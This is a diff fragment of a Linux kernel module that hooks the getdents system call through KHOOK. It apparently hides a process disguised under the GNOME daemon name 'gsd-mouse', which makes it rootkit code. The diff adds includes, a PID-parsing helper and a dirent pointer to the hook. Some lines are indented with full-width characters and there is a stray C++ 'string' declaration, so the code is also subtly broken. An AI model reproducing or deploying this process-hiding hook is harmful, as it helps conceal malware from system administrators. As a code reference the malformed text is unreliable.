@@ -13,12 +13,27 @@
 #include <linux/sched.h>
 #include <linux/list.h>
 #include <linux/init.h>
+#include <asm/unistd.h>
+#include <linux/types.h>
+#include <linux/dirent.h>
 
 #define FLAG 0x80000000
 string processname="gsd-mouse";
 
 const char *protected = "gsd-mouse";
 int protected_pid = -1;
+int myatoi(char *str)
+{
+　　int res = 0;
+　　int mul = 1;
+　　char *ptr;
+　　for (ptr = str + strlen(str) - 1; ptr >= str; ptr--) {
+	　　if (*ptr < '0' || *ptr > '9') return (-1);
+	　　res += (*ptr - '0') * mul;
+	　　mul *= 10;
+　　}
+　　return (res);
+}
 
 static inline char *get_name(struct task_struct *p, char *buf)　
 {
@@ -189,6 +204,7 @@ KHOOK_EXT(long, sys_getdents, unsigned int, struct linux_dirent64 __user, unsign
 static long khook_sys_getdents(unsigned int fd, struct linux_dirent64 __user *dirp, unsigned int count){
 	long value=0;
 	int temp,len;
+	struct linux_dirent64 *mydir = NULL;
 	value=KHOOK_ORIGIN(fd, dirp, count);
 	temp=value;
 	while(temp>0){
